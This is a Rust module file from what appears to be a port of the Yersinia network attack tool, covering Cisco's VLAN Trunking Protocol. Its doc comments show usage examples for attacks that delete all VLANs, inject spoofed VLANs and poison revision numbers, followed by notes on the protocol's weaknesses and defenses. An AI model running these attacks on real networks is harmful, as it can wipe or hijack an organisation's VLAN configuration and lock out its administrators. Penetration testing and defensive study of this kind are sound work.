//! VTP (VLAN Trunking Protocol) Implementation
//!
//! Complete implementation of Cisco's VLAN Trunking Protocol with 100% parity
//! to the original Yersinia implementation.
//!
//! # Protocol Overview
//!
//! VTP is a Cisco proprietary Layer 2 protocol used to manage VLAN configurations
//! across a network. It allows for centralized VLAN administration and automatic
//! propagation of VLAN changes.
//!
//! ## VTP Message Types
//!
//! - **Summary Advertisement**: Sent periodically (every 5 minutes) or when a change occurs
//! - **Subset Advertisement**: Contains VLAN information, follows Summary Advertisements
//! - **Advertisement Request**: Requests VLAN information from other switches
//! - **Join**: Used for VTP pruning
//!
//! ## VTP Versions
//!
//! - **Version 1**: Original implementation
//! - **Version 2**: Adds Token Ring support and consistency checks
//! - **Version 3**: Adds extended VLAN support and enhanced security
//!
//! # Attacks Implemented
//!
//! ## Delete All VLANs Attack
//!
//! Removes all VLANs from a domain (except VLAN 1) by sending a Summary Advertisement
//! with a high revision number followed by a Subset with only default VLANs.
//!
//! ```no_run
//! use yersinia_protocols::vtp::{VtpDeleteVlanAttack, VtpProtocol};
//! use yersinia_core::{Interface, MacAddr};
//!
//! let interface = Interface::new(
//!     "eth0".to_string(),
//!     0,
//!     MacAddr([0x00, 0x11, 0x22, 0x33, 0x44, 0x55]),
//! );
//!
//! let attack = VtpDeleteVlanAttack::new(
//!     interface,
//!     "corporate",  // Domain name
//!     100,          // Target revision (0 = learn from network)
//!     1000,         // Interval in ms
//! );
//! ```
//!
//! ## VLAN Spoofing Attack
//!
//! Injects fake VLAN configurations into a VTP domain. Can be used to:
//! - Add new VLANs
//! - Modify existing VLAN properties
//! - Delete specific VLANs
//!
//! ```no_run
//! use yersinia_protocols::vtp::{VtpSpoofingAttack, VlanInfo};
//! use yersinia_core::{Interface, MacAddr};
//!
//! let interface = Interface::new(
//!     "eth0".to_string(),
//!     0,
//!     MacAddr([0x00, 0x11, 0x22, 0x33, 0x44, 0x55]),
//! );
//!
//! let mut attack = VtpSpoofingAttack::new(
//!     interface,
//!     "corporate",  // Domain name
//!     200,          // Revision number
//!     1000,         // Interval in ms
//! );
//!
//! // Add a custom VLAN
//! attack.add_vlan(VlanInfo::new(999, "malicious".to_string()));
//! ```
//!
//! ## Revision Poisoning
//!
//! Increments the revision number to a very high value, effectively locking out
//! legitimate administrators from making VLAN changes (they would need to manually
//! reset all switches or increment to an even higher number).
//!
//! ```no_run
//! use yersinia_protocols::vtp::VtpSpoofingAttack;
//! use yersinia_core::{Interface, MacAddr};
//!
//! let interface = Interface::new(
//!     "eth0".to_string(),
//!     0,
//!     MacAddr([0x00, 0x11, 0x22, 0x33, 0x44, 0x55]),
//! );
//!
//! let attack = VtpSpoofingAttack::new_poison(
//!     interface,
//!     "corporate",  // Domain name
//!     999999,       // Very high revision
//!     100,          // Fast interval
//! );
//! ```
//!
//! # Security Considerations
//!
//! VTP has several security weaknesses:
//!
//! 1. **No Authentication (v1, v2)**: By default, VTP does not authenticate advertisements
//! 2. **Weak MD5 (when enabled)**: MD5 passwords can be brute-forced
//! 3. **Revision Number Trust**: Switches trust higher revision numbers unconditionally
//! 4. **Client Mode Danger**: Switches in client mode blindly accept all changes
//!
//! ## Defense Recommendations
//!
//! - Use VTP transparent mode or disable VTP entirely
//! - Use VTP version 3 with authentication
//! - Implement private VLANs and VLAN access control
//! - Monitor for unexpected VTP advertisements
//! - Use port security and 802.1X

pub mod attack;
pub mod packet;
pub mod protocol;

// Re-export main types for convenience
pub use attack::{VtpAddVlanAttack, VtpDeleteVlanAttack, VtpDeleteVlanAttack2, VtpSpoofingAttack};
pub use packet::{
    calculate_vtp_md5, default_cisco_vlans, VlanInfo, VlanStatus, VlanType, VtpMessageData,
    VtpMessageType, VtpMode, VtpPacket, VtpVersion, VTP_DOMAIN_NAME_MAX, VTP_MD5_DIGEST_SIZE,
    VTP_MULTICAST_MAC, VTP_SNAP_TYPE,
};
pub use protocol::VtpProtocol;
